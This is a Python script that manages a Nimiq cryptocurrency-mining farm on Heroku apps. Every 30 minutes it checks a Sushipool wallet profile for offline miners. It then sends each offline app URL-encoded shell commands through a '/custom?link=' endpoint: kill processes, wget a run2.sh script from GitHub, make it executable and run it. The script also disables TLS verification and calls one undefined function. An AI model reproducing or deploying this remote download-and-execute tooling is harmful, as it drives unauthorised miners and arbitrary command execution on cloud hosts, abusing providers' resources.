import time
import sys
import os
import requests
from requests.exceptions import ConnectionError
import schedule

def RefreshAccount(pool):
		print("Kill Requet "+pool)
		reqRm = 'http://'+pool+'.herokuapp.com/custom?link=pkill+bash%3Bpkill+miner&key=&lach='
		try:
			f =  requests.get(reqRm,timeout=2,verify=False)
		except:
			pass
		print("Start Sent Requet "+pool)
		reqStart = 'http://'+pool+'.herokuapp.com/custom?link=mkdir+miner%3Bcd+miner%3Bwget+https%3A%2F%2Fraw.githubusercontent.com%2FVinhuit%2Fazurenimpool%2Fmaster%2Fazure_script%2Frun2.sh%3Bchmod+u%2Bx+run2.sh%3B+.%2Frun2.sh+'+pool+'&key=&lach='
		try:
			f =  requests.get(reqStart,timeout=2,verify=False)
		except:
			pass
def Compare():
	with open('offline.txt', 'r') as file1:
		with open('online.txt', 'r') as file2:
			same = set(file1).symmetric_difference(file2)

	same.discard('\n')

	with open('accounts.txt', 'w') as file_out:
		for line in same:
			file_out.write(line)

def json_address_for_sushi():
	wallet_address="NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U"
	sequence_list = wallet_address.split()
	new_string_sushi = '%20'.join(map(str, sequence_list))
	sushi_pool_connect = 'https://api.sushipool.com/api/v1/stats/profile/'
	url_sushi = sushi_pool_connect+new_string_sushi
	return url_sushi
def WalletStatus():
    url_wallet = json_address_for_nimiq_core()
    nimiq_core = requests.get(url_wallet).json()
    wallet_state = nimiq_core['balance']
    balance_formatted = format(wallet_state/100000,'.2f')
    return balance_formatted
	
def SimpleMonitor():
	status = 'online'
	json_address = json_address_for_sushi()
	data = requests.get(json_address).json()
	devices = data['devices']
	open('offline.txt', 'w').close()
	open('online.txt', 'w').close()
	for device in devices:
		miner_name = device['name']
		miner_status = device['device_status']
		
		if miner_status != status:
			open('offline.txt', 'a').write(miner_name+"\n")
		else:
			open('online.txt', 'a').write(miner_name+"\n")

def uptime():
	SimpleMonitor()
	Compare()
	f = open("accounts.txt", "rt")
	for pool in f:
		print("Start rerun "+pool)
		pool =pool.rstrip()
		RefreshAccount(pool)
	
schedule.every(30).minutes.do(uptime)
n=0
while 1:
	schedule.run_pending()
	print(n+1)
	time.sleep(1)